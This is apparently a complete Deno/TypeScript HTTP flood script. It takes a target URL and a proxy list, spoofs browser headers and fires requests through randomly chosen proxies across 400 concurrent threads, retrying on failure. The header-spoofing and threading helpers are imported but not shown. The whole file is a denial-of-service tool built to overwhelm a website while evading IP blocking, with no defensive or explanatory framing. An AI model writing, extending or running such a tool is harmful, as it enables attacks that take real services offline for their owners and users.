import { gotScraping } from 'npm:got-scraping';
import { createSpoof } from './createSpoof/index.ts';
import { createThread } from "./createThread/index.ts";

const url = Deno.args[0];

if (!url) {
    console.error('required: <url>');
    Deno.exit(1);
}

console.log("\x1b[32m[!]\x1b[0m Target: " + url);

const proxiesPath = Deno.args[1];

if (!proxiesPath) {
    console.error('\x1b[31m[X]\x1b[0m required: <url> <!proxyPath>');
    Deno.exit(1);
}

if (!Deno.statSync(proxiesPath).isFile) {
    console.error('\x1b[31m[X]\x1b[0m File not found: ' + proxiesPath);
    Deno.exit(1);
}

const proxies = (await Deno.readTextFile(proxiesPath) ?? "").split('\n') as string[];

if (proxies.length === 0) {
    console.error('\x1b[31m[X]\x1b[0m File is empty: ' + proxiesPath);
    Deno.exit(1);
}

const oneResult = async () => {
    const headers = createSpoof();
    try {
        await gotScraping(url, {
            url,
            headers,
            proxyUrl: proxies[Math.floor(Math.random() * proxies.length)]
        })
    }catch (_) {
        console.error("\x1b[31m[X]\x1b[0m Reconnecting....");
    }
}

createThread(oneResult, 400);